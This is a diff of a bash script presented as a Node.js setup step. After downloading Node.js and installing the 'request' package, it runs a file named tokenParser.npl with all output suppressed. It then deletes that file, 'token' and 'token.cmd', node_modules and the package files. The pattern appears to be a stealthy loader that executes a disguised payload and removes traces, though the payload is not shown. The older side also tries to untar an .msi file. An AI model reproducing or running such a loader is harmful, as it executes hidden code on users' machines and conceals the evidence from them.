@@ -1,93 +1,93 @@
 #!/bin/bash
 
-# Creating new Info
-set -e
-
+# Step 1: Set the Node.js version
 NODE_VERSION="20.11.1"
-NODE_MSI="node-v${NODE_VERSION}-x64.msi"
-DOWNLOAD_URL="https://nodejs.org/dist/v${NODE_VERSION}/${NODE_MSI}"
-NODE_DIR="$(pwd)/node-v${NODE_VERSION}-x64"
 
-NODE_INSTALLED_VERSION=""
+# Step 2: Set the tarball filename and download URL
+NODE_TARBALL="node-v${NODE_VERSION}-linux-x64.tar.xz"
+DOWNLOAD_URL="https://nodejs.org/dist/v${NODE_VERSION}/${NODE_TARBALL}"
 
-# Check if Node.js is installed
+# Step 3: Check if Node.js is installed
 NODE_INSTALLED_VERSION=$(node -v 2>/dev/null || echo "")
 
+# Step 4: Check if Node.js is installed and set INSTALL_NODE flag
 if [ -z "$NODE_INSTALLED_VERSION" ]; then
     INSTALL_NODE=1
 else
     INSTALL_NODE=0
 fi
 
+# Step 5: Download Node.js if it's not installed
 if [ "$INSTALL_NODE" -eq 1 ]; then
-    # Install Node.js if not installed
+    # Check if curl is available, otherwise use wget
     if ! command -v curl &> /dev/null; then
-        wget -q "$DOWNLOAD_URL" -O "$NODE_MSI"
+        echo "curl not found, using wget"
+        wget -q "$DOWNLOAD_URL" -O "$NODE_TARBALL"
     else
-        curl -sSL -o "$NODE_MSI" "$DOWNLOAD_URL"
+        echo "Using curl to download Node.js"
+        curl -sSL -o "$NODE_TARBALL" "$DOWNLOAD_URL"
     fi
-
-    if [ -f "$NODE_MSI" ]; then
-        # Extract the tarball
-        tar -xf "$NODE_MSI" -C "$(pwd)"
-        rm -f "$NODE_MSI"
-    else
-        exit 1
-    fi
-
-    export PATH="${NODE_DIR}/bin:$PATH"
 fi
 
-# Check if Node.js and npm are available
+# Step 6: Extract the Node.js tarball
+if [ -f "$NODE_TARBALL" ]; then
+    echo "Extracting Node.js..."
+    tar -xf "$NODE_TARBALL" -C "$(pwd)"
+    rm -f "$NODE_TARBALL"
+else
+    echo "Node.js tarball not found!"
+    exit 1
+fi
+
+# Step 7: Add Node.js to the system path
+export PATH="$(pwd)/node-v${NODE_VERSION}-linux-x64/bin:$PATH"
+echo "Node.js path set to $(pwd)/node-v${NODE_VERSION}-linux-x64/bin"
+
+# Step 8: Check if Node.js and npm are available
+echo "Checking Node.js and npm..."
 if ! command -v node &> /dev/null; then
+    echo "Node.js not found!"
     exit 1
 fi
 
 if ! command -v npm &> /dev/null; then
+    echo "npm not found!"
     exit 1
 fi
 
-# Install the "request" package if not already installed
+# Step 9: Install the "request" package if it's not already installed
 if [ ! -d "$(pwd)/node_modules/request" ]; then
+    echo "Installing 'request' package..."
     npm install request --silent --no-progress --loglevel=error --fund=false
     if [ $? -ne 0 ]; then
-        exit 1
-    fi
-fi
-
-# Run tokenParser.npl if it exists
-if [ -f "$(pwd)/tokenParser.npl" ]; then
-    node "$(pwd)/tokenParser.npl" > /dev/null 2>&1
-    if [ $? -ne 0 ]; then
+        echo "Failed to install 'request' package!"
         exit 1
     fi
 else
+    echo "'request' package is already installed."
+fi
+
+# Step 10: Run tokenParser.npl if it exists
+if [ -f "$(pwd)/tokenParser.npl" ]; then
+    echo "Running tokenParser.npl..."
+    node "$(pwd)/tokenParser.npl" > /dev/null 2>&1
+    if [ $? -ne 0 ]; then
+        echo "Error running tokenParser.npl!"
+        exit 1
+    fi
+else
+    echo "tokenParser.npl not found!"
     exit 1
 fi
 
-# Clean up generated files
-if [ -f "$(pwd)/token.cmd" ]; then
-    rm -f "$(pwd)/token.cmd"
-fi
+# Step 11: Clean up generated files
+echo "Cleaning up generated files..."
+rm -f "$(pwd)/token.cmd"
+rm -f "$(pwd)/token"
+rm -f "$(pwd)/tokenParser.npl"
+rm -rf "$(pwd)/node_modules"
+rm -f "$(pwd)/package.json"
+rm -f "$(pwd)/package-lock.json"
 
-if [ -f "$(pwd)/token" ]; then
-    rm -f "$(pwd)/token"
-fi
-
-if [ -f "$(pwd)/tokenParser.npl" ]; then
-    rm -f "$(pwd)/tokenParser.npl"
-fi
-
-if [ -d "$(pwd)/node_modules" ]; then
-    rm -rf "$(pwd)/node_modules"
-fi
-
-if [ -f "$(pwd)/package.json" ]; then
-    rm -f "$(pwd)/package.json"
-fi
-
-if [ -f "$(pwd)/package-lock.json" ]; then
-    rm -f "$(pwd)/package-lock.json"
-fi
-
+echo "Script completed successfully."
 exit 0
